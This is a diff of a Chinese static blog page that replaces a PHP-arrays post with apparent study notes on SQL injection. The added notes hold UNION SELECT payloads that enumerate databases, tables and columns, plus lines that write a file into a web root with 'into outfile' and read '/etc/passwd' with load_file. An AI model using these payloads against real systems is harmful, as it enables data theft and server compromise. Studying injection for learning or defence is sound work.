@@ -79,17 +79,17 @@
 
 
 
-<meta name="description" content="创建数组 $arr = array()  $arr = array(1,2,3,4,5)  $arr = array(&amp;apos;name&amp;apos; =&amp;gt; &amp;apos;zs&amp;apos;, &amp;apos;age&amp;apos; =&amp;gt; 18)">
+<meta name="description" content="123and 0 union select(select group_concat(schema_name) from information_schema.schemata),2-49;//查出所有库的名字and 0 union select(select group_concat(table_name) from information_schema.tables where table_sc">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PHP数组">
-<meta property="og:url" content="http://yoursite.com/2019/08/08/PHP数组/index.html">
+<meta property="og:title" content="union select联合查询">
+<meta property="og:url" content="http://yoursite.com/2019/08/14/union-select/index.html">
 <meta property="og:site_name" content="ZLH">
-<meta property="og:description" content="创建数组 $arr = array()  $arr = array(1,2,3,4,5)  $arr = array(&amp;apos;name&amp;apos; =&amp;gt; &amp;apos;zs&amp;apos;, &amp;apos;age&amp;apos; =&amp;gt; 18)">
+<meta property="og:description" content="123and 0 union select(select group_concat(schema_name) from information_schema.schemata),2-49;//查出所有库的名字and 0 union select(select group_concat(table_name) from information_schema.tables where table_sc">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-08-09T00:29:52.562Z">
+<meta property="og:updated_time" content="2019-08-14T05:29:56.734Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="PHP数组">
-<meta name="twitter:description" content="创建数组 $arr = array()  $arr = array(1,2,3,4,5)  $arr = array(&amp;apos;name&amp;apos; =&amp;gt; &amp;apos;zs&amp;apos;, &amp;apos;age&amp;apos; =&amp;gt; 18)">
+<meta name="twitter:title" content="union select联合查询">
+<meta name="twitter:description" content="123and 0 union select(select group_concat(schema_name) from information_schema.schemata),2-49;//查出所有库的名字and 0 union select(select group_concat(table_name) from information_schema.tables where table_sc">
 
 
 
@@ -119,13 +119,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/08/08/PHP数组/">
+  <link rel="canonical" href="http://yoursite.com/2019/08/14/union-select/">
 
 
 
 
 
-  <title>PHP数组 | ZLH</title>
+  <title>union select联合查询 | ZLH</title>
   
 
 
@@ -232,7 +232,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/08/PHP数组/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/14/union-select/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="John Doe">
@@ -249,7 +249,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">PHP数组</h1>
+          <h1 class="post-title" itemprop="name headline">union select联合查询</h1>
         
 
         <div class="post-meta">
@@ -261,8 +261,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-08T08:48:00+08:00">
-                2019-08-08
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-14T13:22:26+08:00">
+                2019-08-14
               </time>
             
 
@@ -299,119 +299,16 @@
       
 
       
-        <p>创建数组</p>
-<pre><code>$arr = array()
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 0 union select(select group_concat(schema_name) from information_schema.schemata),2-49;//查出所有库的名字</span><br><span class="line">and 0 union select(select group_concat(table_name) from information_schema.tables where table_schema =&apos;test&apos;),2-49;//查出所有表的名字</span><br><span class="line">and 0 union select(select group_concat(schema_name) from information_schema.columns where table_schema=&apos;test&apos; and table_name=&apos;users&apos; ),2-49;//查出所有列的名字</span><br></pre></td></tr></table></figure>
 
-$arr = array(1,2,3,4,5)
+<a id="more"></a>
+<p>查询有多少列 order by<br>order by 50 25 40 45 二分法<br>test,uesrs,id,username,password,ip,email,time</p>
+<p>select ==&gt;echo</p>
+<p>version();版本<br>database();数据库<br>user();</p>
+<p>concat合并数据显示<br>grout concat 同上<br>concat_ws()</p>
+<p>left()<br>right()<br>select mid/substr/subsring 从第x位 取x</p>
+<p>– 空格   /* */  注释<br>distinct 去重<br>hex(‘a’)==&gt;0x<br>union select 联合查询 前后参数与列数相同<br>order by ‘ ‘  排序<br>order by 1 给第一列排序<br>like ‘%q%’ 包含q的 ‘%q’ q在结尾 ‘q%’ q在开头<br>limit 截取取行<br>写文件<br>into dumpfile “filepath” //绝对路径<br>into outfile “filepath” //绝对路径<br>select 123 into outfile/dumpfile’/var/www/html/eval.php’;<br>读文件<br>load_file(‘filepath’) //jdlj<br>select load_file(‘/etc/passwd’);<br>create table data(<br>    data text<br>)<br>insert into data valus (load_file(‘’));<br> – secure-file</p>
 
-$arr = array(&apos;name&apos; =&gt; &apos;zs&apos;, &apos;age&apos; =&gt; 18)</code></pre><a id="more"></a>
-
-<pre><code>// 下边的方法，只有在php5.4之后才可以
-
-$arr = []
-
-$arr = [1, 2, 3, 4]
-
-$arr = [&apos;name&apos; =&gt; &apos;zs dskjfsd #$@HTUndsjn &quot;:&gt;?&lt;*((*&amp;&amp;**&amp;*&amp;**&apos;, &apos;age&apos; =&gt; 18]
-
-$arr = array(&apos;name&apos; =&gt; &apos;zs&apos;, 2, &apos;age&apos; =&gt; 18, 1)
-
-$a = &apos;123&apos;;
-$a[0] = 123; </code></pre><p>索引数组</p>
-<pre><code>赋值
-
-// 创建时直接赋值
-
-$arr = array(1,2,3,4,5)
-
-$arr = [1, 2, 3, 4]
-
-// 先创建数组
-
-$arr = array(1,2,3,4,5)
-
-$arr = array()
-
-$arr[0] = 123   // ==&gt;  [123, 2, 3, 4, 5]
-
-$arr[100] = 456  // ==&gt; [1, 2, 3, 4, 5,..., 456]
-
-取值
-
-// 通过下标取值
-
-$arr = array(1,2,3,4,5)
-
-echo $arr[4]
-
-// 通过循环遍历
-
-for($i = 0; $i &lt; 5; $i ++ ){    // 为什么从0开始，是因为数组中，下标是从0开始的
-    echo $arr[$i];
-}  
-
-for($i = 0; $i &lt; count($arr); $i ++ ){
-    echo $arr[$i];
-} 
-
-foreach($arr as $key =&gt; $value){
-    echo $key . &apos;&apos; . $value;
-}
-
-foreach($arr as $value){
-    echo $value;
-}</code></pre><p>关联数组</p>
-<pre><code>赋值
-
-$arr = array(&apos;name&apos; =&gt; &apos;zhangsan&apos;, &apos;age&apos; =&gt; 19);
-
-$arr = [&apos;name&apos; =&gt; &apos;zhangsan&apos;, &apos;age&apos; =&gt; 19];
-
-$arr = []
-
-$arr = array()
-
-$arr[&apos;name&apos;] = &apos;zs&apos;;    ==&gt;  [&apos;name&apos; =&gt; &apos;zs&apos;]
-
-
-
-
-取值   // 不能够通过下标取值
-
-$_GET[&apos;id&apos;]
-
-$_POST[&apos;uname&apos;]
-
-$arr[&apos;id&apos;]
-
-$arr[0] 
-
-foreach($arr as $key =&gt; $value){
-    echo $key . &apos;&apos; . $value;
-}
-
-foreach($arr as $value){
-    echo $value;
-}
-
-for遍历关联数组</code></pre><p>数组常用函数</p>
-<pre><code>array_keys( $arr  ) // 返回一个索引数组   包含所有数组的键
-
-array_values( $arr  ) // 返回一个索引数组  包含所有数组的值
-
-count()  sizeof()
-
-array_merge() // 合并数组   相当于 +
-
-array_key_exists() // 判断键是否存在
-
-sort() // 排序
-
-in_array()  // 判断元素是否在数组中
-
-array_unique() // 去重
-
-array_pop()  // 删除最后一个元素</code></pre>
       
     </div>
     
@@ -435,8 +332,8 @@ array_pop()  // 删除最后一个元素</code></pre>
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/08/07/20190806/" rel="next" title="五角星">
-                <i class="fa fa-chevron-left"></i> 五角星
+              <a href="/2019/08/13/数据库查询/" rel="next" title="数据库查询">
+                <i class="fa fa-chevron-left"></i> 数据库查询
               </a>
             
           </div>
@@ -444,10 +341,6 @@ array_pop()  // 删除最后一个元素</code></pre>
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/08/10/810/" rel="prev" title="PHP笔记">
-                PHP笔记 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
